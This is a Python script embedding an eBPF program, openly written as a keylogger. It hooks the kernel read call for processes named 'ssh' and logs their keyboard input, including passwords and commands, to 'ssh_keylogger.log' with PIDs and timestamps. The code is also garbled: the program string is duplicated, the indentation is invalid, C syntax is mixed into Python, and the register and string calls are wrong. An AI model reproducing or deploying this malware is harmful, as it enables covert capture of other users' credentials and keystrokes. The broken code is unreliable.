from pyroute2 import BPF
import time
import os
from datetime import datetime

# Define the eBPF program
ebpf_program = """
#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/unistd.h>
#include <linux/sched.h>


# Define the eBPF program (same as before)
   ebpf_program = """
#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/unistd.h>
#include <linux/sched.h>

struct bpf_map_def SEC("maps") keylog_map = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(int),
    .value_size = sizeof(struct keylog_entry),
    .max_entries = 1024,
};

struct keylog_entry {
    char key[1024];
    char time[32];
    int pid;
};

SEC("kprobe/read")
int bpf_read(struct pt_regs *ctx) {
    int fd = (int)PT_REGS_PARM1(ctx);
    void *buf = (void *)PT_REGS_PARM2(ctx);
    size_t count = (size_t)PT_REGS_PARM3(ctx);

    int pid = (int)PT_REGS_PARM5(ctx);
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));
    if (strcmp(comm, "ssh") != 0) return 0;

    if (fd == 0) {
        char keylog[1024] = {0};
        size_t len = count;
        if (len > sizeof(keylog) - 1)
            len = sizeof(keylog) - 1;
        bpf_probe_read_user_str(keylog, len, buf);

        struct keylog_entry entry = {
            .pid = pid,
            .time = "time",
            .key = keylog,
        };

        bpf_map_update_elem(&keylog_map, &pid, &entry, BPF_ANY);
    };

    return 0;
}
"""
# loading the program and attaching it
bpf = BPF(text=ebpf_program)
bpf.attach_kprobe(name="read", fn_name="bpf_read")

# creating the log file 


  log_file = "ssh_keylogger.log"
  with open(log_file, "w") as f:
  pass # clear any previous logs 

# while the loop is true read from map aand write to teh file 

while True:
map_data = bpf.get_map("keylog_map")
    for key, value in map_data.items():
        pid = key
        entry = value

        # Formatting the timestamps 
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Writing to the log file 
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] PID: {pid} | Keystrokes: {entry.key}\n")
        
        # Clear the old entries 
        bpf_map_delete_elem(&keylog_map, &pid)



    time.sleep(1)  # Check every second







